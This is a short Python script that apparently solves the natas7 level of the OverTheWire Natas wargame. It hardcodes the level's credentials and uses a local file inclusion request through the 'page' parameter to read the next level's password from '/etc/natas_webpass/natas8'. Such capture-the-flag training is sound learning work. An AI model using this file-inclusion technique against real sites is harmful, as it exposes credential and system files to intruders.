import requests
import  re

username = 'natas7'
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'
url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

# response = session.post(url, auth = (username, password))
# content = response.text
# print(content) ## discovered a hint to where natas8 is located. Also how to was serving up files

response = session.post(url + 'index.php?page=/etc/natas_webpass/natas8', auth = (username, password))
content = response.text
# print(content)
print(re.findall('<br>\n(.*)\n\n<!--', content)[0])